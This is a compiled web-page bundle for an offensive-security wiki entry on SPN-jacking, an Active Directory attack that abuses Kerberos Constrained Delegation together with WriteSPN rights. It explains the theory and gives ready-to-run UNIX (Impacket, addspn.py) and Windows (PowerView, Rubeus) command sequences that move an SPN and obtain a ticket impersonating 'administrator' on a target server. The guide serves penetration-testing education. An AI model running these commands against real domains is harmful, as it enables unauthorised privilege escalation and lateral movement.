import{_ as n,c as k,a5 as o,G as t,w as a,j as i,a as s,B as r,o as d}from"./chunks/framework.B5CpDqM0.js";const C=JSON.parse('{"title":"SPN-jacking","description":"","frontmatter":{"authors":"ShutdownRepo, sckdev"},"headers":[],"relativePath":"ad/movement/kerberos/spn-jacking.md","filePath":"ad/movement/kerberos/spn-jacking.md","lastUpdated":1724982529000}'),p={name:"ad/movement/kerberos/spn-jacking.md"};function c(g,e,F,E,u,y){const l=r("PluginTabsTab"),h=r("PluginTabs");return d(),k("div",null,[e[2]||(e[2]=o('<h1 id="spn-jacking" tabindex="-1">SPN-jacking <a class="header-anchor" href="#spn-jacking" aria-label="Permalink to &quot;SPN-jacking&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>This attack combines <a href="./delegations/constrained">Kerberos Constrained delegation abuse</a> and <a href="./../dacl/">DACL abuse</a>. A service configured for Kerberos Constrained Delegation (KCD) can impersonate users on a set of services. The &quot;set of services&quot; is specified in the constrained delegation configuration. It is a list of SPNs (Service Principal Names) written in the <code>msDS-AllowedToDelegateTo</code> attribute of the KCD service&#39;s object.</p><p>In standard KCD abuse scenarios, an attacker that gains control over a &quot;KCD service&quot; can operate lateral movement and obtain access to the other services/SPNs. Since KCD allows for impersonation, the attacker can also impersonate users (e.g. domain admins) on the target services. Depending on the SPNs, or if it&#39;s possible to <a href="./ptt#modifying-the-spn">modify it</a>, the attacker could also gain admin access to the server the &quot;listed SPN&quot; belongs to.</p><p>On top of all that, if attacker is able to move a &quot;listed SPN&quot; from the original object to the another one, he could be able to compromise it. This is called SPN-jacking and it was intially discovered and explaine by <a href="https://twitter.com/elad_shamir" target="_blank" rel="noreferrer">Elad Shamir</a> in <a href="https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/" target="_blank" rel="noreferrer">this post</a>.</p><ol><li>In order to &quot;move the SPN&quot;, the attacker must have the right to edit the target object&#39;s <code>ServicePrincipalName</code> attribute (i.e. <code>GenericAll</code>, <code>GenericWrite</code> over the object or<code>WriteProperty</code> over the attribute (called <code>WriteSPN</code> <a href="https://posts.specterops.io/introducing-bloodhound-4-1-the-three-headed-hound-be3c4a808146" target="_blank" rel="noreferrer">since BloodHound 4.1</a>), etc.).</li><li>If the &quot;listed SPN&quot; already belongs to an object, it must be removed from it first. This would require the same privileges (<code>GenericAll</code>, <code>GenericWrite</code>, etc.) over the SPN owner as well (<em>a.k.a. &quot;Live SPN-jacking&quot;</em>). Else, the SPN can be simply be added to the target object (<em>a.k.a. &quot;Ghost SPN-jacking&quot;</em>).</li></ol><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2><div class="tip custom-block"><p>In this scenario, we assume the Kerberos Constrained Delegation is configured <a href="./delegations/constrained#with-protocol-transition">with protocol transition</a> in order to keep things simple. However, the SPN-jacking attack can be conducted on <a href="./delegations/constrained#without-protocol-transition">KCD without protocol transition</a> as well (cf. <a href="./delegations/constrained#rbcd-approach">RBCD technique</a>).</p><p>In this scenario (following <a href="https://twitter.com/elad_shamir" target="_blank" rel="noreferrer">Elad</a>&#39;s <a href="https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/" target="_blank" rel="noreferrer">post</a>):</p><ul><li>serverA is configured for KCD</li><li>serverB&#39;s SPN is listed in serverA&#39;s KCD configuration</li><li>serverC is the final target</li><li>attacker controls serverA, has at least WriteSPN over serverB (if needed, &quot;live SPN-jacking&quot;), and at least WriteSPN over serverC.</li></ul></div>',8)),t(h,null,{default:a(()=>[t(l,{label:"UNIX-like"},{default:a(()=>e[0]||(e[0]=[i("p",null,[s("From UNIX-like machines, "),i("a",{href:"https://github.com/dirkjanm/krbrelayx",target:"_blank",rel:"noreferrer"},"krbrelayx"),s("'s "),i("a",{href:"https://github.com/dirkjanm/krbrelayx/blob/master/addspn.py",target:"_blank",rel:"noreferrer"},"addspn.py"),s(" and "),i("a",{href:"https://github.com/SecureAuthCorp/impacket",target:"_blank",rel:"noreferrer"},"Impacket"),s(" example scripts (Python) can be used to conduct the different steps (manipulate SPNs, obtain and manipulate tickets).")],-1),i("div",{class:"note custom-block"},[i("p",null,[i("em",null,"At the time of writing, 12th Feb. 2022,"),s(),i("a",{href:"https://github.com/SecureAuthCorp/impacket/pull/1256",target:"_blank",rel:"noreferrer"},[i("em",null,"the pull request")]),s(),i("em",null,[s("adding the "),i("code",null,"tgssub.py"),s(" is pending.")]),s(),i("a",{href:"https://github.com/SecureAuthCorp/impacket/pull/1184",target:"_blank",rel:"noreferrer"},[i("em",null,"The pull request")]),s(),i("em",null,[s("modifying the "),i("code",null,"findDelegation.py"),s(" is pending.")])]),i("p",null,[i("em",null,"At the time of writing, 12th Feb. 2022, this technique has not been fully fool-proofed from UNIX systems. In case something errors, switch to the Windows technique.")])],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 1. show SPNs listed in the KCD configuration")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"findDelegation.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -user"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'serverA$'"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"/"'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'":"'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"')]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 2. remove SPN from ServerB if required (live SPN-jacking)")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"addspn.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --clear"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -t"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'ServerB$'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"/"'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DomainController.domain.local'")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 3. add SPN to serverC")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"addspn.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -t"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'ServerC$'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --spn"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "cifs/serverB"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"/"'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -c"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DomainController.domain.local'")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 4. request an impersonating service ticket for the SPN through S4U2self + S4U2proxy")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"getST"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -spn"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "cifs/serverB"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -impersonate"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "administrator"'),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'domain/serverA$:$PASSWORD'")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 5. Edit the ticket's SPN (service class and/or hostname)")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"tgssub.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -in"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," serverB.ccache"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -out"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," newticket.ccache"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -altservice"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "cifs/serverC"')])])])],-1),i("p",null,[s("Once the final service ticket is obtained, it can be used with "),i("a",{href:"./ptc"},"Pass the Cache"),s(" / "),i("a",{href:"./ptt"},"Pass the Ticket"),s(" to access the target.")],-1)])),_:1}),t(l,{label:"Windows"},{default:a(()=>e[1]||(e[1]=[i("p",null,[s("From Windows machines, "),i("a",{href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",target:"_blank",rel:"noreferrer"},"PowerView"),s(" (PowerShell) and "),i("a",{href:"https://github.com/GhostPack/Rubeus",target:"_blank",rel:"noreferrer"},"Rubeus"),s(" (C#) can be used to conduct the different steps (manipulate SPNs, obtain and manipulate tickets).")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 1. show SPNs listed in the KCD configuration")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Get-DomainObject"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Identity ServerA$ "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Properties "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'msDS-AllowedToDelegateTo'")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 2. remove SPN from ServerB if required (live SPN-jacking)")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Set-DomainObject"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Identity ServerB$ "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Clear "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'ServicePrincipalName'")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 3. add SPN to serverC")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Set-DomainObject"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Identity ServerC$ "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Set "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"@"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"{ServicePrincipalName"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'cifS/serverB'"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"}")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 4. request an impersonating service ticket for the SPN through S4U2self + S4U2proxy")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Rubeus.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," s4u "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"nowrap "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"msdsspn:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"cifs/serverB"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"impersonateuser:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"administrator"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"domain:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"user:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"password:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"')]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 5. Edit the ticket's SPN (service class and/or hostname)")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Rubeus.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," tgssub "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"nowrap "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"altservice:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"host/serverC"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ticket:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"ba64ticket"')])])])],-1),i("p",null,[s("Once the final service ticket is obtained, it can be used with "),i("a",{href:"./ptt"},"Pass the Ticket"),s(" to access the target.")],-1)])),_:1})]),_:1}),e[3]||(e[3]=i("h2",{id:"resources",tabindex:"-1"},[s("Resources "),i("a",{class:"header-anchor",href:"#resources","aria-label":'Permalink to "Resources"'},"​")],-1)),e[4]||(e[4]=i("p",null,[i("a",{href:"https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse",target:"_blank",rel:"noreferrer"},"https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse")],-1))])}const b=n(p,[["render",c]]);export{C as __pageData,b as default};
